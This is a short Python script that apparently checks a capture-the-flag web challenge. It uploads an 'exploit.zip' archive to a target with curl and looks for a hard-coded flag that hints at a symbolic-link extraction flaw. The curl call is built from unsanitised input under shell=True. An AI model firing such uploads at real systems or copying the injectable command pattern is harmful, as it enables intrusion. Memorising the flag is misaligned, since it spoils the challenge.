import requests
import subprocess
import urllib.parse as urlparse
import sys


def web_extract2(host):
    if "http" not in host:
        host = "https://" + host

    # connect check
    try:
        res = requests.get(urlparse.urljoin(host, "/"), timeout=3)
        res.raise_for_status()
    except Exception:
        return 2

    # check
    try:
        res = subprocess.run(
            "curl -X POST " + host + ' -F "file=@exploit.zip" -F "target=docx"',
            shell=True,
            capture_output=True,
            timeout=3,
        )
        if res.returncode != 0:
            print("curl command execution failed")
            return 1
        if "FLAG{4x7ract_i3_br0k3n_by_3ymb01ic_1ink_fi1e}" in res.stdout.decode():
            return 0
        else:
            return 1
    except Exception:
        return 1


if __name__ == "__main__":
    if web_extract2(sys.argv[1]) != 0:
        exit(1)
